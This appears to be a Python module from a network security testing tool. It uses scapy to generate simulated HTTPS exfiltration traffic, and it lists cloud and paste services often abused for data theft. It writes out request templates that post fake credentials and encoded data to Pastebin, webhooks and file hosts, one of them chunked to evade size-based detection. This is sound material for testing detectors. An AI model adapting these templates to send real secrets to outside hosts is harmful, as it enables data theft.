"""HTTPS exfiltration traffic module."""

import base64
import json
import random
import string
from typing import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


# Cloud storage services often abused for exfiltration
EXFIL_DOMAINS = [
    "pastebin.com",
    "transfer.sh",
    "file.io",
    "dropbox.com",
    "drive.google.com",
    "onedrive.live.com",
    "mega.nz",
    "anonfiles.com",
]


class HTTPSExfilModule(TrafficModule):
    """Traffic module for HTTPS exfiltration patterns.

    Generates HTTPS traffic that simulates data exfiltration
    via encrypted channels to legitimate-looking services.
    """

    def __init__(self) -> None:
        """Initialize the HTTPS exfiltration module."""
        self._exfil_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="https_exfil",
            description="HTTPS exfiltration (large POSTs, encoded URLs, cloud storage abuse)",
            category=TrafficCategory.EXFILTRATION,
            protocols=["TCP"],
            ports=[443, 8443],
        )

    def _generate_large_post(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate large POST request (bulk data exfiltration)."""
        # Simulate large data payload
        fake_data = ''.join(random.choices(string.ascii_letters + string.digits, k=2048))
        encoded_data = base64.b64encode(fake_data.encode()).decode()

        body = json.dumps({
            "data": encoded_data,
            "timestamp": "2023-12-15T12:00:00Z",
            "chunk": random.randint(1, 100)
        })

        domain = random.choice(EXFIL_DOMAINS)

        http_request = (
            f"POST /upload HTTP/1.1\r\n"
            f"Host: {domain}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_encoded_url_params(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate exfiltration via encoded URL parameters."""
        fake_data = "username=admin&password=secret123&ssn=123-45-6789"
        encoded = base64.b64encode(fake_data.encode()).decode()

        domain = random.choice(EXFIL_DOMAINS)

        http_request = (
            f"GET /api/log?d={encoded[:100]} HTTP/1.1\r\n"
            f"Host: {domain}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_cloud_storage_upload(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate cloud storage upload pattern."""
        # Dropbox-style upload
        filename = f"backup-{random.randint(10000, 99999)}.zip"
        fake_content = b"PK" + bytes(random.randint(0, 255) for _ in range(100))  # ZIP header

        boundary = "----WebKitFormBoundary7MA4YWxk"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/zip\r\n\r\n"
        ).encode() + fake_content + f"\r\n--{boundary}--\r\n".encode()

        http_request = (
            f"POST /2/files/upload HTTP/1.1\r\n"
            f"Host: content.dropboxapi.com\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Authorization: Bearer fake_token\r\n"
            f"\r\n"
        ).encode() + body

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request)
        )
        yield packet

    def _generate_steganography_indicator(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate image upload with potential steganography."""
        # Fake JPEG with appended data (stego indicator)
        # JPEG magic bytes + fake header + hidden data indicator
        fake_jpeg = bytes([0xFF, 0xD8, 0xFF, 0xE0]) + b"JFIF" + bytes(50) + b"HIDDEN_DATA_HERE"

        boundary = "----ImageBoundary"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="image"; filename="photo.jpg"\r\n'
            f"Content-Type: image/jpeg\r\n\r\n"
        ).encode() + fake_jpeg + f"\r\n--{boundary}--\r\n".encode()

        http_request = (
            f"POST /api/images/upload HTTP/1.1\r\n"
            f"Host: image-hosting.com\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
        ).encode() + body

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request)
        )
        yield packet

    def _generate_webhook_exfil(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate webhook-based exfiltration pattern."""
        # Slack/Discord webhook abuse
        webhook_hosts = [
            "hooks.slack.com",
            "discord.com/api/webhooks",
            "webhook.site",
        ]

        host = random.choice(webhook_hosts)
        exfil_data = {
            "text": f"Data: {base64.b64encode(b'sensitive_info').decode()}",
            "username": "DataBot"
        }

        body = json.dumps(exfil_data)

        http_request = (
            f"POST /services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_pastebin_post(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate Pastebin-style paste creation."""
        sensitive_data = "credentials: admin:password123\napi_key: sk-1234567890abcdef"
        encoded = base64.b64encode(sensitive_data.encode()).decode()

        body = f"api_dev_key=fake_key&api_option=paste&api_paste_code={encoded}"

        http_request = (
            f"POST /api/api_post.php HTTP/1.1\r\n"
            f"Host: pastebin.com\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_chunked_exfil(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate chunked transfer exfiltration pattern."""
        # Multiple small chunks to evade size-based detection
        chunks = []
        for i in range(5):
            chunk_data = f"chunk{i}:" + ''.join(random.choices(string.hexdigits, k=32))
            chunks.append(f"{len(chunk_data):x}\r\n{chunk_data}\r\n")

        chunks.append("0\r\n\r\n")  # End chunk

        body = "".join(chunks)

        http_request = (
            f"POST /api/collect HTTP/1.1\r\n"
            f"Host: analytics.example.com\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate HTTPS exfiltration packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with HTTPS exfiltration patterns
        """
        port = dst_port or 443
        self._exfil_count += 1

        # Rotate through different exfiltration methods
        method = self._exfil_count % 7

        if method == 0:
            yield from self._generate_large_post(src_ip, dst_ip, port)
        elif method == 1:
            yield from self._generate_encoded_url_params(src_ip, dst_ip, port)
        elif method == 2:
            yield from self._generate_cloud_storage_upload(src_ip, dst_ip, port)
        elif method == 3:
            yield from self._generate_steganography_indicator(src_ip, dst_ip, port)
        elif method == 4:
            yield from self._generate_webhook_exfil(src_ip, dst_ip, port)
        elif method == 5:
            yield from self._generate_pastebin_post(src_ip, dst_ip, port)
        else:
            yield from self._generate_chunked_exfil(src_ip, dst_ip, port)

